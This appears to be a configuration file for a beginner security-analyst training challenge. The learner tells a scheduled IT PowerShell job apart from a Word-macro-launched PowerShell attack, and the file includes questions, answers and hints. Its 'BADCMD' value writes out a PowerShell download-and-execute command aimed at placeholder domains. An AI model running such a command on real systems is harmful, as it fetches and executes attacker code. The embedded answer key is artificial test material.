@@ -1,0 +1,61 @@
+{
+    "id": "two-alerts",
+    "title": "Same Alert, Different Story",
+    "category": "soc",
+    "level": "Beginner",
+    "order": 2,
+    "summary": "The rule 'PowerShell with a hidden command' fired on several computers this morning. Most of them are the IT team's daily script. One is not.",
+    "story": "You are the analyst on shift at {{CO}} (a made-up company). PowerShell is Windows' command language: IT teams use it every day, and so do attackers. The SIEM has a rule that fires whenever PowerShell is started with an encoded (hidden) command, and this morning it fired several times. Look at what started each one and what it did, and sort the harmless from the harmful.",
+    "goal": "Decide which alert is a real attack, then answer the questions about it: the computer, the account, the program that started PowerShell, the file that was opened and the web address it reached for.",
+    "skills": "reading process events (which program started which), parent processes, decoding base64, DNS lookups",
+    "defender": "none",
+    "start": "soc",
+    "minutes": 20,
+    "vars": {
+        "CO": "company",
+        "UA": "person:flast", "UB": "person:flast", "O1": "person:flast", "O2": "person:flast",
+        "HA": "num:10-29", "HB": "num:30-49", "H3": "num:50-69", "H4": "num:70-99",
+        "NET": "subnet:10",
+        "T0": "time:10-15",
+        "DOC": "pick:Invoice_0457.docm|Payment_Details.docm|Order_Confirmation.docm|Shipping_Notice.docm|Overdue_Notice.docm",
+        "DLDOM": "pick:docs-view-online.example|invoice-portal-secure.example|quickpay-files.example|cdn-docshare.example",
+        "DLIP": "ip",
+        "ITCMD": "Get-ComputerInfo | Out-File \\\\FILE01\\it-inventory\\$env:COMPUTERNAME.txt",
+        "BADCMD": "Invoke-WebRequest -Uri http://{{DLDOM}}/view.ps1 -UseBasicParsing | Invoke-Expression",
+        "REAL": "pick:a|b"
+    },
+    "variants": {
+        "REAL": {
+            "a": { "BADH": "WS-{{HA}}", "BADU": "{{UA}}", "BADIP": "{{NET}}.{{HA}}", "GOODH": "WS-{{HB}}", "VA": "real" },
+            "b": { "BADH": "WS-{{HB}}", "BADU": "{{UB}}", "BADIP": "{{NET}}.{{HB}}", "GOODH": "WS-{{HA}}", "VA": "false alarm" }
+        }
+    },
+    "siem": {
+        "start": "{{T0}}",
+        "noise": {
+            "count": 150, "from": "-4h", "to": "+45m",
+            "hosts": [ "WS-{{HA}}", "WS-{{HB}}", "WS-{{H3}}", "WS-{{H4}}" ],
+            "users": [ "{{UA}}", "{{UB}}", "{{O1}}", "{{O2}}" ],
+            "ips": [ "{{NET}}.{{HA}}", "{{NET}}.{{HB}}", "{{NET}}.{{H3}}", "{{NET}}.{{H4}}" ],
+            "net": "{{NET}}", "servers": [ "FILE01" ], "dc": "DC01", "domain": "{{CO_DOMAIN}}"
+        }
+    },
+    "machines": [
+        { "name": "soc", "hostname": "soc.{{CO_DOMAIN}}", "role": "your box: the analyst's workstation", "nics": [ "{{NET}}.250/24" ] }
+    ],
+    "questions": [
+        { "id": "verdict", "ask": "The alert on WS-{{HA}}: real attack or false alarm? (one try)", "answer": "{{VA}}", "tries": 1, "points": 60,
+          "explain": "On {{BADH}}, PowerShell was started by Word right after a document was opened, and it reached out to a web address. On the others, it was started by svchost.exe (the Task Scheduler) as SYSTEM at the same time on several computers: the IT team's daily inventory." },
+        { "id": "host", "ask": "Which computer was really attacked?", "answer": "{{BADH}}", "points": 30, "explain": "The alert whose PowerShell has winword.exe as its parent." },
+        { "id": "parent", "ask": "Which program started PowerShell there (its parent)?", "answer": "winword.exe", "accept": [ "word", "microsoft word", "C:\\Program Files\\Office\\winword.exe" ], "points": 30, "explain": "The parent= field of that PowerShell's process event." },
+        { "id": "doc", "ask": "Which file had the person just opened?", "answer": "{{DOC}}", "accept": [ "C:\\Users\\{{BADU}}\\Downloads\\{{DOC}}" ], "points": 30, "explain": "The cmdline of the winword.exe that started just before." },
+        { "id": "domain", "ask": "Which web address (domain name) did that PowerShell reach for?", "answer": "{{DLDOM}}", "points": 30, "explain": "The DNS lookup straight after (and the decoded command) name it." },
+        { "id": "user", "ask": "Which account was signed in on the attacked computer?", "answer": "{{BADU}}", "points": 20, "explain": "The user= field of those process events." }
+    ],
+    "hints": [
+        { "text": "What to think about first: the same alert can be harmless or harmful. The question to ask about any program is 'who started it, and what did it do next?'. A program started by the system's scheduler at the same moment on many computers is usually IT. A program started by a document someone just opened is a classic way in.", "cost": 3 },
+        { "text": "siem alerts lists the alerts with their host. For each one, look at the process events (source=proclog) on that computer: siem search source=proclog host=WS-NN image=*powershell* shows which PowerShell started, as which user, and its parent= (the program that started it). The * in image=*powershell* means 'anything here'.", "cost": 5 },
+        { "text": "-EncodedCommand hides the command as base64 text. On this pretend SIEM you can decode it on your own box: echo 'THE TEXT' | base64 -d (copy the text after -EncodedCommand). One of them saves an inventory to the file server; the other downloads something from the internet and runs it.", "cost": 8 },
+        { "text": "On the attacked computer, look at everything around that time: siem search host=WS-NN shows the program that started Word (and the file it opened), the DNS lookup of the web address (source=dns, query=) and the firewall letting the connection out. Answer with the host, the account (user=), the parent (winword.exe), the file name and the domain name.", "cost": 12 }
+    ]
+}
